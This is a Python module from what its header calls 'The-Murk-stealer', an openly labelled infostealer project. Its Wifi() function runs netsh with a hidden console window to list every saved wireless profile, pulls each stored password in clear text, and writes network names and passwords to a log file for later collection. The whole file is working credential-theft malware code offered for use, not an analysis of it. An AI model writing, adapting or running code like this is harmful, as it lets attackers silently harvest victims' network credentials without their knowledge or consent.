#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, run
from re import findall, search
from os import environ
from preferences.config import config

def Wifi():
    user = environ['USERPROFILE']
    pathToLogs = f'{user}\\{config.pathToLogs}\\System'
    logs = []
    startupinfo = STARTUPINFO()
    startupinfo.dwFlags |= STARTF_USESHOWWINDOW
    profiles_output = run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, startupinfo=startupinfo)
    profile_names = findall(r':\s(.+)', profiles_output.stdout)

    wifi_passwords = {}

    for profile in profile_names:
        password_output = run(['netsh', 'wlan', 'show', 'profile', 'name=' + profile, 'key=clear'], capture_output=True, text=True, startupinfo=startupinfo)
        password = search(r'Key Content\s+:\s(.+)', str(password_output.stdout))

        if password:
            wifi_passwords[profile] = password.group(1)
        else:
            wifi_passwords[profile] = None

    passwords = wifi_passwords

    for profile, password in passwords.items():
        profile = profile.encode('cp1251', errors='ignore').decode('utf-8', errors='ignore')
        if password != None:
            password = password.encode('cp1251', errors='ignore').decode('utf-8', errors='ignore')

        logs.append(f'Wi-Fi Network: {profile}\nPassword: {password}\n')

    with open(pathToLogs+"\\wifi.txt", 'w', encoding='UTF-8') as f:
        for log in logs:
            f.write(log+'\n')